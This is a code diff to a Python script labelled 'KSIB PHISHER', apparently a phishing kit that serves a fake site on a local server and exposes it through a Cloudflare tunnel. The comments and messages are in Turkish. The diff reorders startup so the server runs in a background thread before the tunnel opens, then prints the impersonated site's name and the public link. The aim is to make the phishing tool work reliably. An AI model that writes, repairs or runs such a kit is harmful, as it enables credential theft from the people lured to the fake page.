@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 # KSIB PHISHER - iSH CLOUDFLARE (CALISAN)
 import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket, re
@@ -410,6 +411,22 @@ def main():
         except OSError: 
             print(f"   ❌ Port {port} kullaniliyor!")
 
+    # ===== 1. ÖNCE SUNUCUYU BAŞLAT =====
+    print("\n🔄 Sunucu başlatiliyor...")
+    try: 
+        server = CustomTCPServer(("", port), Handler)
+        print(f"   ✅ Sunucu {port} portunda çalisiyor!")
+    except OSError: 
+        print(f"❌ Port {port} kullaniliyor!")
+        sys.exit(1)
+    
+    # Sunucuyu ayrı bir thread'de başlat (bloklamasın)
+    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
+    server_thread.start()
+    print("   ⏳ Sunucu arka planda çalisiyor...")
+    time.sleep(2)
+
+    # ===== 2. SONRA TÜNELİ AÇ =====
     tunnel_url = start_cloudflare_tunnel(port)
 
     if not tunnel_url:
@@ -419,10 +436,11 @@ def main():
         print("   💡 Çözüm:")
         print("      apk add wget")
         print("      /tmp/cloudflared tunnel --url http://localhost:8080")
+        server.shutdown()
         sys.exit(1)
 
     print("\n" + "="*50)
-    print("✅ BASARILI!")
+    print("✅ TUM ISLEMLER BASARILI!")
     print("="*50)
     print(f"\n🌐 SITE: {SITES[Handler.site][0]}")
     print(f"🔗 LINK: {tunnel_url}")
@@ -431,17 +449,14 @@ def main():
     print("🛑 DURDUR: Ctrl+C")
     print("\n" + "="*50)
 
-    try: 
-        server = CustomTCPServer(("", port), Handler)
-    except OSError: 
-        print(f"❌ Port {port} kullaniliyor!")
-        sys.exit(1)
-    
-    try: 
-        server.serve_forever()
-    except KeyboardInterrupt: 
+    # Ana thread'i canlı tut
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n🛑 Sunucu durduruluyor...")
         server.shutdown()
-        print("\n🛑 Sunucu durduruldu!")
+        print("✅ Durduruldu!")
 
 if __name__ == "__main__":
     try: main()
